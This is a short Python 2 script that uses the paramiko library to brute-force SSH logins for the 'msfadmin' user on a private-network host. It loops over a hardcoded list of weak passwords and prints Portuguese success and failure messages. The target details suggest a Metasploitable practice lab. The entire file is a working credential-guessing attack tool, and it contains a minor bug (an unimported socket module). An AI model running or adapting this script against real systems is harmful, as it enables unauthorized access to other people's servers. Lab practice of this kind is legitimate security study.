#!/usr/bin/python
import paramiko
import sys

IPADDRESS="192.168.100.16"
SSHPORT=22
USERNAME = "msfadmin"
PASSWORD  = ['x', 'xx', '123', '1234', '12345', '123456', 'msf', 'msfadm', 'msfadmin']

ssh = paramiko.SSHClient()
ssh.load_system_host_keys()
ssh.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy())
 
for _PASS in PASSWORD:
    try:
        ssh.connect(IPADDRESS , port=SSHPORT, username=USERNAME, password=_PASS)
        print "BINGO a senha do " + USERNAME + " eh: " + _PASS
    except paramiko.AuthenticationException, error:
        print "FALHOU - A senha do usuario: " + USERNAME + " nao eh: " + _PASS
    except socket.error, error:
        print error
    except paramiko.SSHException, error:
        print error
        print "Algum problema com a Host ke"
 
 
